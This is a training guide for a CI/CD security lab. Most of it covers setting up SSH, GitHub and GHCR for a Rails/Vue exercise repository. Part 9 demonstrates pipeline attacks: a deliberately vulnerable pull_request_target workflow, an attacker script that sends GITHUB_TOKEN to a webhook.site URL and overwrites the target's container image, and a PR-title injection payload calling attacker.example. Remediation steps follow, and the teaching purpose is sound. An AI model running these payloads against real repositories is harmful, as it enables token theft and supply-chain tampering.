# GitHub + GitHub Actions CI/CD Setup Guide

This guide walks you through publishing the **SwiftDrop / pipeline-security** exercise to GitHub and running the included CI/CD pipeline that builds and pushes Docker images to GitHub Container Registry (GHCR).

The same repository will later be used to demonstrate real-world GitHub Actions security vulnerabilities.

---

## Prerequisites

| Tool | Check |
|------|-------|
| `git` | `git --version` |
| `ssh-keygen` | built into every Linux/macOS install |
| Docker (optional, for local testing) | `docker --version` |
| `gh` CLI (optional shortcut) | `gh --version` |

> **`gh` CLI is optional.** SSH keys + a browser cover everything. The `gh` commands shown
> throughout are labelled **(gh shortcut)** — skip them if you prefer the browser.

### Install gh CLI (optional, Kali-specific)

The GitHub CLI is not in Kali's default repos — you must add GitHub's own apt source:

```bash
curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg \
  | sudo dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg
sudo chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] \
  https://cli.github.com/packages stable main" \
  | sudo tee /etc/apt/sources.list.d/github-cli.list
sudo apt update && sudo apt install gh -y
```

---

## Part 1 — Create a GitHub Account

Go to https://github.com and register if you don't already have one.
Your **username** (e.g. `piotr-trainer`) will appear in every image URL, so choose it deliberately.

---

## Part 2 — Set Up SSH Authentication (Primary Method)

SSH keys are the standard authentication method for developers in corporate environments.
You generate a key pair locally, keep the private key on your machine, and add the public key to GitHub.
Git then uses the private key silently for every push and pull.

### 2.1 Configure your Git identity

These values appear in every commit you make:

```bash
git config --global user.name "Your Name"
git config --global user.email "you@example.com"
```

### 2.2 Generate an Ed25519 SSH key

Ed25519 is the current recommended algorithm — faster and more secure than RSA.

```bash
ssh-keygen -t ed25519 -C "you@example.com"
```

When prompted:
- **File location:** press Enter to accept the default (`~/.ssh/id_ed25519`)
- **Passphrase:** choose a strong passphrase (protects your private key if the file is stolen)

This creates two files:
```
~/.ssh/id_ed25519        ← private key — never share this
~/.ssh/id_ed25519.pub    ← public key — this goes to GitHub
```

### 2.3 Start the SSH agent and load the key

The agent holds your decrypted key in memory so you don't type the passphrase on every push:

```bash
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_ed25519
```

To make this automatic on login, add those two lines to your `~/.bashrc` or `~/.zshrc`.

### 2.4 Copy your public key

```bash
cat ~/.ssh/id_ed25519.pub
```

Copy the entire output (one long line starting with `ssh-ed25519`).

### 2.5 Add the public key to GitHub

1. Go to **GitHub → Settings → SSH and GPG keys**
   (direct URL: https://github.com/settings/ssh/new)
2. Click **New SSH key**
3. **Title:** something descriptive, e.g. `kali-lab-machine`
4. **Key type:** `Authentication Key`
5. Paste the public key
6. Click **Add SSH key**

**(gh shortcut)** — does the same without opening a browser:
```bash
gh auth login   # choose SSH, then follow prompts — it uploads the key automatically
```

### 2.6 Test the connection

```bash
ssh -T git@github.com
```

Expected output:
```
Hi <your-username>! You've successfully authenticated, but GitHub does not provide shell access.
```

If you see `Permission denied (publickey)`, check that:
- The key was added to GitHub (Step 2.5)
- The SSH agent is running with the key loaded (Step 2.3)

---

## Part 3 — Create the GitHub Repository

### Option A — Browser (primary)

1. Go to https://github.com/new
2. **Repository name:** `pipeline-security-exercise`
3. **Description:** `CI/CD pipeline security exercise — Rails + Vue.js`
4. **Visibility:** Public (required for free GHCR usage with `GITHUB_TOKEN`)
5. Leave all other options unchecked (no README, no .gitignore — we'll push our own)
6. Click **Create repository**

GitHub will show you a page with setup instructions — keep it open, you'll need the SSH remote URL in the next step.

### Option B — gh CLI shortcut

```bash
gh repo create pipeline-security-exercise \
  --public \
  --description "CI/CD pipeline security exercise — Rails + Vue.js" \
  --clone=false
```

> **Visibility note:** Public repos can push to GHCR for free using the automatic `GITHUB_TOKEN`.
> Private repos work identically but count against your package storage quota.

---

## Part 4 — Initialise Git and Push the Exercise

All commands below run from inside the exercise directory:

```bash
cd /home/kali/Desktop/SecurityLabs/exercise-pipeline-security
```

### 4.1 Initialise the local repository

```bash
git init
git branch -M main
```

### 4.2 Add a .gitignore

```bash
cat > .gitignore << 'EOF'
# Rails runtime
backend/log/*.log
backend/tmp/
backend/storage/*.sqlite3
backend/storage/*.sqlite3-journal

# Node
frontend/node_modules/
frontend/dist/

# OS
.DS_Store
EOF
```

> **Training note:** `backend/config/master.key` and `backend/.kamal/secrets` are intentionally
> **not** in .gitignore. They contain real secrets and are committed on purpose to serve as
> a training example of leaked credentials in source control (see Part 8).
> In any real project these files must be gitignored and secrets stored in GitHub Secrets.

### 4.3 Stage and commit everything

```bash
git add .
git commit -m "Initial commit: pipeline-security exercise"
```

### 4.4 Add the SSH remote and push

Use the **SSH** remote URL (starts with `git@`), not the HTTPS one:

```bash
git remote add origin git@github.com:<your-username>/pipeline-security-exercise.git
git push -u origin main
```

The `-u` flag sets `origin/main` as the default upstream so future `git push` and `git pull`
commands need no arguments.

Confirm it's live — open the repo in the browser:

```bash
# Browser: https://github.com/<your-username>/pipeline-security-exercise
# gh shortcut:
gh repo view --web
```

---

## Part 5 — Understand the CI/CD Workflow

The workflow file already lives at `.github/workflows/build-and-publish.yml`.
GitHub Actions picks it up automatically once the file reaches the `main` branch.

### What the workflow does

```
push to main
      │
      ├─► Job: build-and-push-backend  (runs in parallel)
      │         • Checks out code
      │         • Logs into GHCR with GITHUB_TOKEN
      │         • Builds  ./backend/Dockerfile
      │         • Tags image:  ghcr.io/<owner>/pipeline-security-backend:latest
      │                        ghcr.io/<owner>/pipeline-security-backend:<git-sha>
      │         • Pushes both tags to GHCR
      │
      └─► Job: build-and-push-frontend  (runs in parallel)
                • Same steps for ./frontend/Dockerfile
                • Image: ghcr.io/<owner>/pipeline-security-frontend:latest
```

On a **pull request** the images are built but **not pushed** — safe when triggered from forks.

### Permissions used

```yaml
permissions:
  contents: read   # checkout the code
  packages: write  # push images to GHCR
```

`GITHUB_TOKEN` is provisioned automatically by GitHub for every run — no manual secret needed.

---

## Part 6 — Watch the Pipeline Run

### Browser (primary)

1. Go to your repository on GitHub
2. Click the **Actions** tab
3. Click the running workflow to see live logs

### gh CLI shortcut

```bash
gh run list --limit 5
gh run watch
```

### Verify images were published

**Browser:** Go to your GitHub profile → **Packages** tab.
You should see `pipeline-security-backend` and `pipeline-security-frontend`.

**gh CLI shortcut:**
```bash
gh api user/packages?package_type=container --jq '.[].name'
```

---

## Part 7 — Pull and Run the Images Locally

Docker uses HTTPS to talk to GHCR, so SSH keys don't apply here.
Authentication uses a **Personal Access Token (PAT)** or the `gh` CLI token.

### 7.1 Create a PAT for Docker login (browser)

1. Go to **GitHub → Settings → Developer settings → Personal access tokens → Tokens (classic)**
   (direct URL: https://github.com/settings/tokens/new)
2. **Note:** `docker-ghcr-pull`
3. **Expiration:** 30 days (or as needed)
4. **Scopes:** check `read:packages`
5. Click **Generate token** and copy it immediately — GitHub shows it only once

### 7.2 Log Docker in to GHCR

```bash
echo "<your-PAT>" | docker login ghcr.io -u <your-username> --password-stdin
```

**(gh shortcut)** — reuses the gh session token, no PAT needed:
```bash
echo $(gh auth token) | docker login ghcr.io -u $(gh api user --jq .login) --password-stdin
```

### 7.3 Pull the images

```bash
docker pull ghcr.io/<your-username>/pipeline-security-backend:latest
docker pull ghcr.io/<your-username>/pipeline-security-frontend:latest
```

### 7.4 Run the backend

```bash
docker run -d \
  -p 3000:80 \
  -e RAILS_MASTER_KEY=$(cat backend/config/master.key) \
  --name ps-backend \
  ghcr.io/<your-username>/pipeline-security-backend:latest
```

### 7.5 Run the frontend

```bash
docker run -d \
  -p 5173:80 \
  --name ps-frontend \
  ghcr.io/<your-username>/pipeline-security-frontend:latest
```

Open http://localhost:5173 — the SwiftDrop UI should load.

---

## Part 8 — Repository Structure Reference

```
pipeline-security-exercise/
├── .github/
│   └── workflows/
│       └── build-and-publish.yml   ← CI/CD pipeline
├── backend/
│   ├── Dockerfile                  ← Rails production image (multi-stage)
│   ├── config/
│   │   ├── master.key              ← ⚠ secret — intentional for training
│   │   └── credentials.yml.enc
│   └── .kamal/secrets              ← ⚠ secret — intentional for training
├── frontend/
│   └── Dockerfile                  ← Vue.js → nginx static image
├── install.sh
├── start.sh
└── PIPELINE-SETUP.md               ← this file
```

---

## Part 9 — GitHub Actions Security Issues to Demonstrate

This repository is set up to demonstrate the following classes of pipeline vulnerability.

### 9.1 Secrets in source code
**What:** `config/master.key` and `.kamal/secrets` are committed to the repo.
**Risk:** Anyone with read access has the Rails master key, which decrypts
`credentials.yml.enc` (database passwords, API keys, etc.).
**Demo:**
```bash
git log --all -p -- backend/config/master.key
```

### 9.2 Unpinned third-party Actions
**What:** The workflow references `actions/checkout@v4` and `docker/login-action@v3` by
mutable tag, not by immutable commit SHA.
**Risk:** A compromised or typo-squatted Action at that tag can exfiltrate `GITHUB_TOKEN`
or inject malicious build steps into every pipeline run.
**Demo:** Replace a tag with its pinned SHA and show the diff:
```yaml
# vulnerable — tag can be moved
uses: actions/checkout@v4

# hardened — SHA is immutable
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### 9.3 `pull_request_target` privilege escalation

**What:** `pull_request_target` runs the **base repo's** workflow with write-level
`GITHUB_TOKEN` even when the PR comes from a fork. If the workflow also checks out the
PR's code and executes it, the attacker's code runs with the elevated token.

**Risk:** A stranger with only a free GitHub account — no SSH key, no PAT, no repo access —
can exfiltrate `GITHUB_TOKEN` and use it to overwrite published container images, push
commits, or call any GitHub API the token reaches.

**Requires two roles for the demo:** run the Instructor steps in your normal browser session;
run the Attacker steps in a separate incognito window logged in as a second GitHub account
(a throwaway account is fine).

---

#### INSTRUCTOR — prepare the vulnerable workflow (your normal browser / terminal)

**Step 1 — get a capture URL for the demo**

Open https://webhook.site in your browser. Copy the unique URL shown on the page
(looks like `https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`).
Every HTTP request to that URL will appear live on the page — this is where the stolen
token will arrive.

**Step 2 — create a helper script that the workflow will run**

```bash
cat > /home/kali/Desktop/SecurityLabs/exercise-pipeline-security/scripts/run-checks.sh << 'EOF'
#!/usr/bin/env bash
echo "Running pre-merge checks..."
echo "All checks passed."
EOF
chmod +x /home/kali/Desktop/SecurityLabs/exercise-pipeline-security/scripts/run-checks.sh
```

**Step 3 — create the vulnerable workflow**

> **Note on `GITHUB_TOKEN` visibility:** GitHub Actions does NOT automatically inject
> `GITHUB_TOKEN` as a shell environment variable. It is only available as
> `${{ secrets.GITHUB_TOKEN }}` in the YAML expression context. Any `run:` step that
> needs the token must receive it explicitly via an `env:` block — which is standard
> practice in real pipelines. That is what makes the attack realistic.

Create `.github/workflows/pr-checks.yml` in the exercise directory:

```yaml
name: PR Checks

on:
  pull_request_target:         # ← dangerous: runs with base-repo token, even for forks
    branches: [main]

jobs:
  checks:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write          # elevated — needed for image publishing

    steps:
      - name: Checkout PR code          # ← dangerous: checks out the ATTACKER's code
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Run checks
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}   # ← explicitly passed to the shell
        run: bash ./scripts/run-checks.sh   # ← runs whatever the attacker put in that file
```

**Step 4 — commit and push**

```bash
cd /home/kali/Desktop/SecurityLabs/exercise-pipeline-security
git add scripts/run-checks.sh .github/workflows/pr-checks.yml
git commit -m "Add PR checks workflow"
git push
```

---

#### ATTACKER — fork and inject (incognito window, second GitHub account)

The attacker needs nothing except a free GitHub account and a browser.
No SSH key. No PAT. No access to the target repository.

**Step 1 — fork the repository**

1. Open the target repo: `https://github.com/<instructor-username>/pipeline-security-exercise`
2. Click **Fork** → **Create fork**
3. GitHub creates `https://github.com/<attacker-username>/pipeline-security-exercise`

**Step 2 — modify `scripts/run-checks.sh` in the fork**

In the fork, navigate to `scripts/run-checks.sh` and click the pencil (edit) icon.
Replace the file contents with:

```bash
#!/usr/bin/env bash
# Step 1 — prove capture to the audience (webhook.site shows this live)
curl -s "https://webhook.site/YOUR-UUID-HERE" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY" \
  -d "actor=$GITHUB_ACTOR"

# Step 2 — abuse the token immediately (it expires when this job exits)
echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin

# Pull any public image and retag it as the legitimate backend image
docker pull ubuntu:latest
docker tag ubuntu:latest ghcr.io/<instructor-username>/pipeline-security-backend:latest

# Overwrite the legitimate image in the target registry
docker push ghcr.io/<instructor-username>/pipeline-security-backend:latest
```

Replace `YOUR-UUID-HERE` with the webhook.site URL from Instructor Step 1.
Replace `<instructor-username>` with the target repo owner's GitHub username.

Commit directly to the fork's `main` branch (default commit message is fine).

**Step 3 — open a pull request**

1. In the fork, click **Contribute → Open pull request**
2. Title: `Fix: improve pre-merge check output` (innocuous-looking)
3. Click **Create pull request**

The PR is now open against the instructor's repo. The attacker waits.

---

#### OBSERVE — watch the attack execute

**In your normal browser (instructor view):**

1. Go to the repo's **Actions** tab
2. The `PR Checks` workflow has started — click it to watch live logs
3. Notice it runs with the **base repo's context**, not the fork's
4. The `Run checks` step executes `run-checks.sh` — which is the **attacker's version**

**Switch to webhook.site** — within seconds you will see an incoming request containing:

```
token=ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxx
repo=<instructor-username>/pipeline-security-exercise
actor=<instructor-username>
```

The token `ghs_...` is a live `GITHUB_TOKEN` with `packages: write` on the base repo.

> **Important:** `GITHUB_TOKEN` is ephemeral — GitHub revokes it the moment the workflow
> run completes. You cannot copy it from webhook.site and reuse it afterwards.
> Any abuse must happen **inside the same script execution**, before the job exits.

For the demo the attacker therefore puts everything into `run-checks.sh` in one shot:

```bash
#!/usr/bin/env bash
# Step 1 — prove the token was captured (for the audience)
curl -s "https://webhook.site/YOUR-UUID" \
  -d "token=$GITHUB_TOKEN" \
  -d "repo=$GITHUB_REPOSITORY"

# Step 2 — abuse it immediately, while the run is still active
echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin
docker pull ubuntu:latest
docker tag ubuntu:latest ghcr.io/<instructor-username>/pipeline-security-backend:latest
docker push ghcr.io/<instructor-username>/pipeline-security-backend:latest
```

webhook.site provides **visual proof** of capture for the audience — the actual damage
(overwriting the image) happens in the runner itself during the same job.

---

#### REMEDIATION — show the fix

The root cause is the combination of `pull_request_target` + checking out PR code.
Two safe options:

**Option A — use `pull_request` instead (simplest fix)**

```yaml
on:
  pull_request:      # token is read-only, fork PRs get no write access
    branches: [main]
```

**Option B — keep `pull_request_target` but never execute PR code**

If you need the elevated token (e.g. to post a review comment), check out the base ref,
not the PR head:

```yaml
- uses: actions/checkout@v4
  # no 'ref:' override — checks out base branch, not the PR's code
```

Run any untrusted code in a separate job that triggers on `pull_request` with no secrets.

---

#### Cleanup after the demo

```bash
git rm .github/workflows/pr-checks.yml scripts/run-checks.sh
git commit -m "Remove vulnerable PR checks workflow (demo cleanup)"
git push
```

### 9.4 Script injection via untrusted input
**What:** Interpolating `${{ github.event.pull_request.title }}` directly into a `run:`
shell command hands control of that command to whoever opens a PR.
**Risk:** Remote code execution inside the runner with access to all in-scope secrets.
**Demo:** Add a step:
```yaml
- run: echo "Building PR: ${{ github.event.pull_request.title }}"
```
Then open a PR whose title is:
```
"; curl https://attacker.example/exfil?t=$GITHUB_TOKEN; echo "
```

### 9.5 Over-broad token permissions
**What:** Omitting the `permissions:` key causes `GITHUB_TOKEN` to inherit the repo's
default, which is `write-all` for most repositories.
**Risk:** A compromised step can push commits, approve PRs, create releases, or call any
GitHub API endpoint the token reaches.
**Demo:** Remove the `permissions:` block from the workflow, re-run, and show the token's
effective scopes via:
```bash
curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/rate_limit \
  | jq '.resources'
```

---

## Quick-Reference Cheat Sheet

```bash
# SSH key setup
ssh-keygen -t ed25519 -C "you@example.com"
eval "$(ssh-agent -s)" && ssh-add ~/.ssh/id_ed25519
cat ~/.ssh/id_ed25519.pub          # paste this into GitHub Settings → SSH keys
ssh -T git@github.com              # verify

# Git identity
git config --global user.name "Your Name"
git config --global user.email "you@example.com"

# Push repo (SSH remote)
git init && git branch -M main
git remote add origin git@github.com:<user>/<repo>.git
git push -u origin main

# Watch pipeline (browser preferred; gh as shortcut)
gh run list && gh run watch

# Docker / GHCR
echo "<PAT>" | docker login ghcr.io -u <user> --password-stdin
docker pull ghcr.io/<user>/pipeline-security-backend:latest
```
